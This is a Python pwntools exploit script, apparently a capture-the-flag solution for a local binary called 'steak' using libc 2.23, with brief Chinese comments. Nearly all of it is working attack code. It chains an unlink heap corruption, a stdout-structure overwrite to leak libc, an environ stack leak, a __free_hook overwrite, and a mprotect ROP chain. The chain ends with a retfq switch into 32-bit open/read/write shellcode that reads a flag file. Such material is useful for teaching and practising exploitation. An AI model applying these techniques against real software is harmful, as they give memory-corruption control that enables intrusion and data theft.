# -*- coding:utf8 -*-
from pwn import *
context(os = 'linux', log_level = 'debug') 
context.terminal = ['tmux', 'splitw', '-h']
p = process('./steak')
libc = ELF('libc-2.23.so')

def Add(size, buf):
    p.sendlineafter('>\n', '1')
    p.sendlineafter('input buf size:\n', str(size))
    p.sendafter('input buf', buf)

def Delete(index):
    p.sendlineafter('>\n', '2')
    p.sendlineafter('input index:\n', str(index))

def Edit(index, size, buf):
    p.sendlineafter('>\n', '3')
    p.sendlineafter('input index:\n', str(index))
    p.sendlineafter('input size:\n', str(size))
    p.sendafter('input new buf:\n', buf)

def Copy(sindex, dindex, length):
    p.sendlineafter('>\n', '4')
    p.sendlineafter('input source index:\n', str(sindex))
    p.sendlineafter('input dest index:\n', str(dindex))
    p.sendlineafter('input copy length:\n', str(length))

def Edit1(index, size, buf):
    p.sendlineafter('>', '3')
    p.sendlineafter('input index:', str(index))
    p.sendlineafter('input size:', str(size))
    p.sendafter('input new buf:', buf)

# unlink
Add(0x80, 'A'*0x80) #0
Add(0x80, 'A'*0x80) #1
Add(0x80, 'A'*0x80) #2
Add(0x80, 'A'*0x80) #3
Add(0x80, 'A'*0x80) #4
payload  = p64(0) + p64(0x81) + p64(0x6021a0) + p64(0x6021a8) + 'A'*0x60 + p64(0x80) + p64(0x90)
Edit(3, 0x90,payload)
Delete(4)

# 修改stdout，leak
payload = p64(0x6021a0) + p64(0x602180)
Edit(3, 0x10, payload)
Copy(1, 0, 0x8)
payload = p64(0xfbad1800) + p64(0)*3 + '\x00'
Edit(0, 0x21, payload)
p.recv(0x18)
libc_base = u64(p.recv(8)) - 0x3c36e0
libc.address = libc_base

"""
将栈地址写入到索引为0的数组中
"""
############ 写入栈地址，为free函数泄漏栈地址作准备 #################
environ_addr = libc.symbols['environ']
payload = p64(0x6021a0) + p64(environ_addr)
Edit1(3, 0x10, payload)

############ 向free_hook汇总写入puts ###################
free_hook = libc.symbols['__free_hook']
puts_addr = libc.symbols['puts']
Edit1(3, 0x8, p64(free_hook))
Edit1(0, 0x8, p64(puts_addr))

############# Delete(1)，泄漏栈地址 ################
p.sendlineafter('>', '2')
p.sendlineafter('input index:', str(1))
p.recvuntil('\n')
stack_addr = u64(p.recv(6) + '\x00\x00')
info("stack_addr ==> " + hex(stack_addr))

################# 在0x602500中写入retfq orw ##############
retfq = 0x811dc + libc.address
orw = asm('''
        mov esp, 0x6029f0

        /* open */
        mov ebx, 0x602544
        mov ecx, 0
        mov edx, 0
        mov eax, 5
        int 0x80

        /* read */
        mov ebx, eax
        mov ecx, 0x602800
        mov edx, 0x40
        mov eax, 3
        int 0x80

        /* write */
        mov ebx, 1
        mov ecx, 0x602800
        mov edx, 0x40
        mov eax, 4
        int 0x80
''', arch = 'i386', os = 'linux')
Edit1(3, 0x8, p64(0x602500))
Edit1(0, len(orw) + 4, orw + 'flag')

############ mprotect #################
mprotect = libc.symbols['mprotect']
info("mprotect ==> " + hex(mprotect))
stack_ret_addr = stack_addr - 0xf0
pop_rdi = 0x0000000000400ca3
pop_rsi = libc_base + 0x202e8
pop_rdx = libc_base + 0x1b92
rop  = p64(pop_rdi) + p64(0x602000)
rop += p64(pop_rsi) + p64(0x1000)
rop += p64(pop_rdx) + p64(7)
rop += p64(mprotect)
rop += p64(retfq)
rop += p64(0x602500)
rop += p64(0x23) + p64(0x602500) # retfq的参数
Edit1(3, 0x8, p64(stack_ret_addr))
Edit1(0, len(rop), rop)
p.sendlineafter('>', '5')
p.interactive()
